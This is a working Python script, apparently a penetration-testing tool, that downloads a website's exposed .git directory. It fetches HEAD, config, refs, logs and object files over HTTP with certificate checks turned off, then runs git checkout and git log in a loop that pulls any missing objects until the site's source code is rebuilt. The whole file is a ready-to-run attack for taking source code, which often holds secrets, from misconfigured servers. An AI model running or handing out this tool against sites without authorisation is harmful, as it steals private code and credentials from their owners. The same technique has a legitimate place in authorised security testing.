import os
import requests
import sys
import shutil
import subprocess
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#These endpoints will verify if the .git dir is available and then it will create them if required

def rebuild_folders(folders,base):
	for folder in folders:
		try:
			os.makedirs(base+folder)
		except:
			print(sys.exc_info())
			pass

def rebuild_objects(endpoints,base):
	for endpoint in endpoints:
		try:
			req = requests.get(url+base+endpoint,stream=True,verify=False)
			if req.status_code == 200:
				#print("Found "+endpoint+" =>"+req.text)
				##if the endpoint is found, the necessary files are created
				w = open(base+endpoint,'wb+')
				req.raw.decode_content = True
				shutil.copyfileobj(req.raw,w)
				w.close
		except:
			print(sys.exc_info())
			pass


if len(sys.argv) < 2:
	print("Usage: python3 tool.py http://website.com/")
	sys.exit()

url = sys.argv[1]+'/.git/'
#Base files and folders

#os.system("git init")
os.system("mkdir .git")
os.chdir(".git")

folders1 = ['branches','hooks','info','logs','objects','refs']
rebuild_folders(folders1,'')

endpoints1 = ['HEAD','index','COMMIT_EDITMSG','config', 'description','packed-refs' ]
rebuild_objects(endpoints1,'')

#Constructing logs
logs_folders = ['refs','refs/heads','refs/remotes','refs/remotes/origin']
logs_files = ['HEAD','refs/heads/master','refs/remotes/origin/HEAD']
rebuild_folders(logs_folders,'logs/')
rebuild_objects(logs_files,'logs/')

#Construction of refs
refs_folders = ['heads','remotes','remotes/origin','tags']
refs_files = ['heads/master','remotes/origin/HEAD']
rebuild_folders(refs_folders,'refs/')
rebuild_objects(refs_files,'refs/')

#Start creating the objects
#First fix all from logs/HEAD

'''
w = open('logs/HEAD','r')
object_id=w.readline().split(" ")[1]
w.close()
print(object_id)
'''

object_ids = []

with open('logs/HEAD') as f:
	for line in f:
		object_id1=line.split(" ")[0]
		object_id2=line.split(" ")[1]
		object_ids.append(object_id1)
		object_ids.append(object_id2)


for object_id in object_ids:
	object_location = object_id[0:2]+"/"+object_id[2:]
	print(object_location)
	object_folders=[object_id[0:2]]
	object_files = [object_location]
	rebuild_folders(object_folders,'objects/')
	rebuild_objects(object_files,'objects/')

'''
object_location = object_id[0:2]+"/"+object_id[2:]
print(object_location)
object_folders=[object_id[0:2]]
object_files = [object_location]
rebuild_folders(object_folders,'objects/')
rebuild_objects(object_files,'objects/')
'''
#Now fix the remaining objects by checking the errors

cmds = [
	
	['git', 'checkout','-f'],
	['git','log']
]

for cmd in cmds:

	while True:
		print(os.getcwd())
		os.chdir("../")
		out = subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
		#out = subprocess.Popen(['git', 'checkout','-f'],stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
		stdout,stderr = out.communicate()
		print(stdout)



		error = stdout.decode('utf-8').strip()
		pos1 = error.find("error:")
		pos2 = error.find("fatal:")
		if pos1 == -1 and pos2 == -1:
			break
		if error.find("You are on a branch yet to be born") >= 0:
			break
		if error.find("not a git repository (or any of the parent directories)") >=0:
			break;
		
		
		shas = re.findall(r"\b[0-9a-f]{40}\b",error)
		print(shas)
		os.chdir(".git")
		
		for object_id in shas:
			#print(object_id)
			#print(os.getcwd())
			
			object_location = object_id[0:2]+"/"+object_id[2:]
			print(object_location)
			object_folders=[object_id[0:2]]
			object_files = [object_location]
			rebuild_folders(object_folders,'objects/')
			rebuild_objects(object_files,'objects/')
			#print(os.getcwd())
			#os.chdir(".git")





print("Now issue `git checkout -f`")
